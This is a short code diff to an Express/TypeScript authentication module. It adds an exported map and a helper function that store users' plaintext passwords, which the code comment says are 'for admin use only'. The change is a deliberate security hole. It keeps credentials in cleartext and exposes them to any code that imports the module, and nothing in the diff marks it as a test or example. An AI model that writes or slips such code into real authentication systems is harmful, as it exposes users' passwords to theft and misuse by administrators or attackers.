@@ -87,3 +87,11 @@ export function isAuthenticated(req: Express.Request, res: Express.Response, nex
   }
   return res.status(401).json({ message: "Unauthorized: Please login" });
 }
+
+// Map to store plaintext passwords for admin use only
+export const plaintextPasswords = new Map<string, string>();
+
+// Function to record a plaintext password
+export function recordPlaintextPassword(username: string, password: string) {
+  plaintextPasswords.set(username, password);
+}
